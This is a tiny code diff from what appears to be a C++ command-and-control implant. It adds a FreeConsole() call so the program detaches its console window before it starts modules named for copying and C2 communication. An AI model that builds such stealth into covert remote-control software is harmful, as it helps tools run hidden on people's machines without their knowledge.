@@ -13,6 +13,7 @@
 
 int main()
 {
+	FreeConsole();
 	// instantiate modules
 	CP copyModule;
 	C2 connModule;
